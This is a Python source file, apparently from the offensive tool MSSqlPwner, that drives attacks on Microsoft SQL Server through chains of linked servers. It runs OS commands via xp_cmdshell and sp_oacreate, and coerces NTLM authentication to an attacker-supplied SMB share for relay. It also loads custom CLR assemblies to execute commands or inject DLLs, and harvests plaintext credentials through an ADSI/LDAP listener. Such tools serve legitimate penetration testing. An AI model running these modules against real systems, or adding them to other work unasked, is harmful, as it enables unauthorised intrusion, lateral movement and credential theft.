########################################################
__author__ = ['Nimrod Levy']
__license__ = 'GPL v3'
__version__ = 'v1.2'
__email__ = ['El3ct71k@gmail.com']

########################################################

import os
import sys
import json
import logging
import readline
import utilities
from impacket import LOG
from typing import Literal
from playbooks import Queries
from classes.operations import Operations
from impacket.examples.utils import parse_target


class Playbooks(Operations):
    def __init__(self, server_address, user_name, args_options):
        super().__init__(server_address, user_name, args_options)

    def disconnect(self, rev2self: bool = True) -> None:
        """
        This function is responsible to revert to SELF and disconnect from the server.
        """
        if rev2self:
            self.call_rev2self()
        super().disconnect()

    def enumerate(self) -> bool:
        """
        This function is responsible to enumerate the server.
        """
        if os.path.exists(self.state_filename):
            if self.use_state:
                if self.auto_yes or utilities.receive_answer("State file already exists, do you want to use it?",
                                                             ["y", "n"], 'y'):
                    self.state = json.load(open(self.state_filename))
                else:
                    for chain_id in self.retrieve_server_information(None, None):
                        self.retrieve_links(chain_id)
        else:
            for chain_id in self.retrieve_server_information(None, None):
                self.retrieve_links(chain_id)

        utilities.store_state(self.state_filename, self.state)
        utilities.print_state(self.state)
        return True

    def execute_command_by_procedure(self, chain_id: str,
                                     command_execution_method: Literal['xp_cmdshell', 'sp_oacreate'], command: str):
        """
        This function is responsible to execute a command on the server using existing procedures.
        e.g. xp_cmdshell, sp_oacreate
        """
        if not command:
            LOG.error("Command is required for exec module")
            return False

        return self.execute_procedure(chain_id, command_execution_method, command)

    def ntlm_relay(self, chain_id: str, relay_method: Literal['xp_dirtree', 'xp_subdirs', 'xp_fileexist'],
                   smb_server: str):
        """
        This function is responsible to execute a ntlm-relay attack on the server using existing procedures.
        e.g. xp_dirtree, xp_subdirs, xp_fileexist
        """
        if not smb_server:
            LOG.error("SMB server is required for ntlm-relay module")
            return False

        share = fr"\\{smb_server}\{utilities.generate_string()}\{utilities.generate_string()}"
        return self.execute_procedure(chain_id, relay_method, share)

    def execute_direct_query(self, chain_id: str, method: Literal['OpenQuery', 'exec_at'], query: str):
        """
        This function is responsible to execute a query on the server.
        e.g. OpenQuery, exec_at
        """
        if not query:
            LOG.error("Query is required for direct_query module")
            return False
        return self.direct_query(chain_id, query, method)

    def retrieve_password(self, chain_id: str, port: int, adsi_provider: str,
                          arch: Literal['autodetect', 'x86', 'x64'], target: str) -> bool:
        """
        This function is responsible to retrieve passwords from the server using custom assemblies.
        """
        domain, username, password, address = parse_target(target)
        server_info = self.state['servers_info'][chain_id]
        if not server_info['adsi_providers']:
            LOG.error("No ADSI providers found")
            return True

        arch = self.detect_architecture(chain_id, arch)
        chain_str = self.generate_chain_str(chain_id)
        if not arch:
            LOG.error(f"Failed to detect the architecture of {chain_str}")
            return False

        ldap_filename = "LdapServer-x64.dll" if arch == 'x64' else "LdapServer-x86.dll"
        ldap_assembly = os.path.join(self.custom_asm_directory, ldap_filename)
        if not server_info['adsi_providers']:
            return False

        if adsi_provider and adsi_provider not in server_info['adsi_providers']:
            LOG.error(f"The {chain_str} server does not support the {adsi_provider} provider")
            return False
        for discovered_provider in server_info['adsi_providers']:
            if adsi_provider and adsi_provider != discovered_provider:
                continue

            if not adsi_provider:
                if (not self.auto_yes) and not utilities.receive_answer(
                        f"Do you want to retrieve passwords from {discovered_provider} provider?",
                        ["y", "n"], 'y'):
                    continue
            listener = self.execute_custom_assembly_function(chain_id, ldap_assembly, "listen", "LdapSrv",
                                                             "ldapAssembly", str(port), "FuncAsm", wait=False)

            if listener and listener['is_success']:
                client = Playbooks(self.server_address, self.username, self.options)
                client.options.debug = False
                LOG.setLevel(logging.ERROR)
                client.connect(username, password, domain)
                client.state = self.state
                LOG.setLevel(logging.DEBUG if self.debug else logging.INFO)
                client.options.debug = self.options.debug
                client.build_chain(chain_id, utilities.format_strings(Queries.LDAP_QUERY, port=port),
                                   method="OpenQuery", adsi_provider=discovered_provider)

                client.disconnect(rev2self=False)
                results = listener['thread'].join()
                if results and results['is_success']:
                    LOG.info(f"Successfully retrieved password from {chain_str}")
                    for credentials in results['results'][0].values():
                        LOG.info(f"[+] Discovered credentials: {credentials}")
                    return True
                else:
                    LOG.warning(f"Failed to retrieve password from {chain_str}")
        return False

    def get_chain_list(self) -> bool:
        """
        This function is responsible to return the chain list.
        """
        LOG.info("Chain list:")
        for server_info in utilities.sort_by_chain_length([v for k, v in self.state['servers_info'].items()]):
            chain_id = server_info['chain_id']
            chain_str = self.generate_chain_str(chain_id)
            user_name = server_info['server_user']
            db_user = server_info['db_user']
            db_name = server_info['db_name']
            LOG.info(f"{chain_id} - {chain_str} ({user_name} {db_user}@{db_name})")
        return True

    def get_linked_server_list(self) -> bool:
        """
        This function is responsible to return the chain list.
        """
        LOG.info("Linked_server_list:")
        link_servers = []
        for server_info in utilities.sort_by_chain_length([v for k, v in self.state['servers_info'].items()]):
            link_name = server_info['link_name']
            link_host = f"{server_info['hostname']}.{server_info['domain_name']}"
            if link_host in link_servers:
                continue
            link_servers.append(link_host)
            LOG.info(f"{link_name} (Hostname: {server_info['hostname']} | Domain: {server_info['domain_name']})")
        return True

    def call_rev2self(self) -> bool:
        """
        This function is responsible to revert the database to the previous state.
        """
        if not self.rev2self:
            LOG.info("Nothing to revert")
            return True
        LOG.info("Reverting to self..")
        for chain_id, query_list in self.rev2self.items():
            chain_str = self.generate_chain_str(chain_id)
            for query in reversed(query_list):
                self.custom_sql_query(query)
            LOG.info(f"Successfully reverted to self on {chain_str}")
        self.rev2self.clear()
        return True

    def get_rev2self_queries(self) -> bool:
        """
        This function is responsible to retrieve the commands that are needed to revert to self.
        """
        for chain_id, queries in self.rev2self.items():
            chain_str = self.generate_chain_str(chain_id)
            for query in queries:
                LOG.info(f"{chain_str}: {query}")
        return True

    def get_execution_list(self, chain_id: str, link_name: str):
        if chain_id:
            server_list = [{"chain_id": chain_id}]
        else:
            server_list = self.filter_server_by_link_name(link_name)

        for server_info in server_list:
            yield server_info['chain_id']

    def get_adsi_provider_list(self):
        """
        This function is responsible to retrieve the ADSI providers.
        """
        LOG.info("ADSI Providers:")
        link_servers = []
        for server_info in utilities.sort_by_chain_length([v for k, v in self.state['servers_info'].items()]):
            link_name = server_info['link_name']
            link_host = f"{server_info['hostname']}.{server_info['domain_name']}"
            if not server_info['adsi_providers']:
                continue
            if link_host in link_servers:
                continue
            link_servers.append(link_host)
            LOG.info(f"{link_name} (Providers: {', '.join(server_info['adsi_providers'])})")
        return True

    def interactive_mode(self, options) -> bool:
        chosen_chain_id = options.chain_id
        chosen_link_name = options.link_name if options.link_name else self.state['hostname']
        parser, available_modules = utilities.generate_arg_parser()
        available_modules.remove("interactive")
        available_modules += ["help", "exit"]
        while True:
            try:
                chain_id = list(self.get_execution_list(chosen_chain_id, chosen_link_name))[0]
                title = self.generate_chain_str(chain_id)

                args_list = input(f"MSSqlPwner#{title}> ").strip()
                selected_module = args_list.split(' ')[0]
                if selected_module not in available_modules:
                    LOG.error(f'Unknown module {selected_module}.')
                    LOG.info(f"Available modules:")
                    for available_module in available_modules:
                        LOG.info(f"\t - {available_module}")
                    continue
                elif args_list == "exit":
                    break
                elif args_list == "help":
                    parser.print_help()
                    continue
                arguments = utilities.split_args(f'{" ".join(sys.argv[1:]).strip()} {args_list}')
                arguments.remove("interactive")
                args = parser.parse_args(arguments)
                if args.module == "enumerate":
                    self.enumerate()
                    continue
                elif args.module == "set-chain":
                    if self.is_valid_chain_id(args.chain):
                        chosen_chain_id = args.chain
                    continue

                elif args.module == "set-link-server":
                    if self.is_valid_link_server(args.link):
                        chosen_link_name = args.link
                        chosen_chain_id = None
                    continue

                if not self.execute_module(chosen_chain_id, chosen_link_name, args):
                    break

            except KeyboardInterrupt:
                break
        return True

    def custom_asm(self, chain_id: str, arch: Literal['autodetect', 'x86', 'x64'], procedure_name: str,
                   command: str) -> bool:
        if not command:
            LOG.error("Command is required for custom-asm module")
            return False

        arch_name = self.detect_architecture(chain_id, arch)
        if not arch_name:
            chain_str = self.generate_chain_str(chain_id)
            LOG.error(f"Failed to detect the architecture of {chain_str}")
            return False

        asm_filename = "CmdExec-x64.dll" if arch_name == 'x64' else "CmdExec-x86.dll"
        file_location = os.path.join(self.custom_asm_directory, asm_filename)
        return self.execute_custom_assembly_procedure(chain_id, file_location, procedure_name, command, "CalcAsm",
                                                      "@command NVARCHAR (4000)")

    def inject_custom_asm(self, chain_id: str, file_location: str, procedure_name: str = "Inject") -> bool:
        if not file_location:
            LOG.error("File location is required for inject-custom-asm module")
            return False
        if not os.path.exists(file_location):
            LOG.error(f"{file_location} does not exist")
            return False
        return self.execute_custom_assembly_procedure(chain_id, file_location, procedure_name, "a", "SqlInject",
                                                      "@command NVARCHAR (4000)")

    def encapsulated_commands(self, chain_id: str, options):
        ret_val = False
        try:
            if options.module == 'exec':
                ret_val = self.execute_command_by_procedure(chain_id, options.command_execution_method, options.command)

            elif options.module == 'ntlm-relay':
                ret_val = self.ntlm_relay(chain_id, options.relay_method, options.smb_server)

            elif options.module == 'custom-asm':
                ret_val = self.custom_asm(chain_id, options.arch, options.procedure_name, options.command)
            elif options.module == 'inject-custom-asm':
                self.inject_custom_asm(chain_id, options.file_location, options.procedure_name)

            elif options.module == 'direct_query':
                ret_val = self.execute_direct_query(chain_id, options.method, options.query)

            elif options.module == 'retrieve-password':
                ret_val = self.retrieve_password(chain_id, options.listen_port, options.adsi_provider, options.arch,
                                                 options.target)

            elif options.module == 'get-chain-list':
                ret_val = self.get_chain_list()
            elif options.module == 'get-link-server-list':
                ret_val = self.get_linked_server_list()
            elif options.module == 'rev2self':
                ret_val = self.call_rev2self()
            elif options.module == 'get-rev2self-queries':
                ret_val = self.get_rev2self_queries()
            elif options.module == 'get-adsi-provider-list':
                ret_val = self.get_adsi_provider_list()
            elif options.module == "interactive":
                ret_val = self.interactive_mode(options)
        except KeyboardInterrupt as e:
            LOG.error(f"An error occurred: {e}")
        return ret_val

    def execute_module(self, chain_id, link_name, options):
        """
        This function is responsible to execute the given module.
        """
        link_name = link_name if link_name else self.state['hostname']
        if options.module == "enumerate":
            # It returned without calling since it is already called in the main function.
            return True

        if chain_id:
            if not self.is_valid_chain_id(chain_id):
                return False

        else:
            if not self.is_valid_link_server(link_name):
                return False
        for chain_id in self.get_execution_list(chain_id, link_name):
            if not self.encapsulated_commands(chain_id, options):
                continue
            break
        return True
